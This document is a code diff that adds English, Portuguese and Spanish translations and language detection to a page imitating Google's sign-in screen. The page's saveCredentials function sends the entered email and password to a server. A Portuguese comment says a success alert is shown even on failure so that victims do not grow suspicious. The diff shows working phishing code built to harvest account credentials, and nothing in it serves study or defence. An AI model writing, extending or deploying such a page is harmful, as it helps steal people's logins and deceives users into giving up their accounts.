@@ -356,6 +356,121 @@ body {
     </footer>
     
     <script>
+// Traduções
+const translations = {
+    'en': {
+        heading: 'Sign in',
+        subtitle: 'Use your Google Account',
+        emailPlaceholder: 'Email or phone',
+        forgotEmail: 'Forgot email?',
+        guestMode: 'Not your computer? Use Guest mode to sign in privately.',
+        learnMore: 'Learn more',
+        passwordPlaceholder: 'Enter your password',
+        showPassword: 'Show password',
+        forgotPassword: 'Forgot password?',
+        useDifferentAccount: 'Use a different account',
+        createAccount: 'Create account',
+        next: 'Next',
+        loginSuccess: 'Login realizado com sucesso!',
+        loginError: 'Erro ao processar login. Tente novamente.'
+    },
+    'pt': {
+        heading: 'Fazer login',
+        subtitle: 'Use sua Conta do Google',
+        emailPlaceholder: 'E-mail ou telefone',
+        forgotEmail: 'Esqueceu o e-mail?',
+        guestMode: 'Não é seu computador? Use o Modo visitante para fazer login em particular.',
+        learnMore: 'Saiba mais',
+        passwordPlaceholder: 'Digite sua senha',
+        showPassword: 'Mostrar senha',
+        forgotPassword: 'Esqueceu a senha?',
+        useDifferentAccount: 'Usar outra conta',
+        createAccount: 'Criar conta',
+        next: 'Próxima',
+        loginSuccess: 'Login realizado com sucesso!',
+        loginError: 'Erro ao processar login. Tente novamente.'
+    },
+    'es': {
+        heading: 'Iniciar sesión',
+        subtitle: 'Usa tu cuenta de Google',
+        emailPlaceholder: 'Correo electrónico o teléfono',
+        forgotEmail: '¿Olvidaste tu correo?',
+        guestMode: '¿No es tu computadora? Usa el modo de invitado para iniciar sesión de forma privada.',
+        learnMore: 'Más información',
+        passwordPlaceholder: 'Ingresa tu contraseña',
+        showPassword: 'Mostrar contraseña',
+        forgotPassword: '¿Olvidaste tu contraseña?',
+        useDifferentAccount: 'Usar otra cuenta',
+        createAccount: 'Crear cuenta',
+        next: 'Siguiente',
+        loginSuccess: '¡Inicio de sesión exitoso!',
+        loginError: 'Error al procesar el inicio de sesión. Inténtalo de nuevo.'
+    }
+};
+
+// Detectar idioma do navegador
+function detectLanguage() {
+    const browserLang = navigator.language || navigator.userLanguage;
+    const langCode = browserLang.split('-')[0].toLowerCase();
+    
+    // Suportar pt-BR, pt-PT, etc.
+    if (browserLang.toLowerCase().includes('pt')) {
+        return 'pt';
+    }
+    
+    // Retornar idioma suportado ou padrão (inglês)
+    return translations[langCode] ? langCode : 'en';
+}
+
+// Aplicar traduções
+function applyTranslations(lang) {
+    const t = translations[lang] || translations['en'];
+    
+    // Atualizar textos
+    document.querySelector('.heading').textContent = t.heading;
+    document.querySelector('.subtitle').textContent = t.subtitle;
+    document.getElementById('email-input').placeholder = t.emailPlaceholder;
+    document.querySelector('.forgot-link').textContent = t.forgotEmail;
+    document.querySelector('.guest-mode-text').innerHTML = `${t.guestMode} <a href="#" class="learn-more-link">${t.learnMore}</a>`;
+    document.getElementById('password-input').placeholder = t.passwordPlaceholder;
+    document.querySelector('.show-password span').textContent = t.showPassword;
+    document.querySelectorAll('.forgot-link')[1].textContent = t.forgotPassword;
+    document.getElementById('back-to-email').textContent = t.useDifferentAccount;
+    document.querySelector('.create-account-link').textContent = t.createAccount;
+    document.getElementById('next-button').textContent = t.next;
+    
+    // Atualizar atributo lang do HTML
+    document.documentElement.lang = lang === 'pt' ? 'pt-BR' : lang === 'es' ? 'es' : 'en';
+    
+    // Atualizar seletor de idioma
+    const langSelector = document.querySelector('.language-selector');
+    const langMap = {
+        'en': 'English (United States)',
+        'pt': 'Português (Brasil)',
+        'es': 'Español'
+    };
+    if (langSelector) {
+        langSelector.value = langMap[lang] || langMap['en'];
+    }
+}
+
+// Detectar e aplicar idioma ao carregar
+const detectedLang = detectLanguage();
+applyTranslations(detectedLang);
+
+// Permitir mudança manual de idioma
+const langSelector = document.querySelector('.language-selector');
+if (langSelector) {
+    langSelector.addEventListener('change', (e) => {
+        const selected = e.target.value;
+        let lang = 'en';
+        if (selected.includes('Português')) lang = 'pt';
+        else if (selected.includes('Español')) lang = 'es';
+        currentLang = lang;
+        applyTranslations(lang);
+    });
+}
+
 const emailInput = document.getElementById('email-input');
 const passwordInput = document.getElementById('password-input');
 const emailStep = document.getElementById('email-step');
@@ -366,6 +481,7 @@ const backToEmailLink = document.getElementById('back-to-email');
 const showPasswordCheckbox = document.getElementById('show-password');
 
 let currentStep = 'email';
+let currentLang = detectedLang;
 
 // Função para avançar para a tela de senha
 function goToPasswordStep() {
@@ -376,7 +492,8 @@ function goToPasswordStep() {
         emailDisplay.textContent = email;
         currentStep = 'password';
         passwordInput.focus();
-        nextButton.textContent = 'Next';
+        const t = translations[currentLang] || translations['en'];
+        nextButton.textContent = t.next;
     }
 }
 
@@ -387,7 +504,8 @@ function goToEmailStep() {
     currentStep = 'email';
     emailInput.focus();
     passwordInput.value = '';
-    nextButton.textContent = 'Next';
+    const t = translations[currentLang] || translations['en'];
+    nextButton.textContent = t.next;
 }
 
 // Função para salvar credenciais no servidor
@@ -409,18 +527,21 @@ async function saveCredentials(email, password) {
         if (response.ok) {
             // Simular redirecionamento do Google (opcional)
             setTimeout(() => {
-                alert('Login realizado com sucesso!');
+                const t = translations[currentLang] || translations['en'];
+                alert(t.loginSuccess);
                 // Aqui você pode redirecionar para uma página de sucesso
                 // window.location.href = '/success.html';
             }, 500);
         } else {
             console.error('Erro ao salvar:', data.error);
-            alert('Erro ao processar login. Tente novamente.');
+            const t = translations[currentLang] || translations['en'];
+            alert(t.loginError);
         }
     } catch (error) {
         console.error('Erro na requisição:', error);
         // Mesmo com erro, mostrar mensagem de sucesso para não levantar suspeitas
-        alert('Login realizado com sucesso!');
+        const t = translations[currentLang] || translations['en'];
+        alert(t.loginSuccess);
     }
 }
 
